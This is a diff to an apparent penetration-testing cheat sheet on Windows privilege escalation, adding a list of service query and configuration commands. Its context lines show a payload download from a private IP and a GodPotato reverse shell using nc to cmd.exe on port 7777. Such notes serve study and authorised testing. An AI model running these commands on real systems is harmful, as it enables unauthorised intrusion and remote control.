@@ -1069,6 +1069,18 @@ iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
 .\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
 ```
 
+### Windows Privesc: Service Commands
+```bash
+# Query the configuration of a service:
+sc.exe qc <name>
+# Query the current status of a service:
+sc.exe query <name>
+# Modify a configuration option of a service:
+sc.exe config <name> <option>= <value>
+#Start/Stop a service:
+net start/stop <name>
+```
+
 ### Windows Privesc: Insecure Service Permissions
 ```bash
 # Check if we can modify the "daclsvc" service
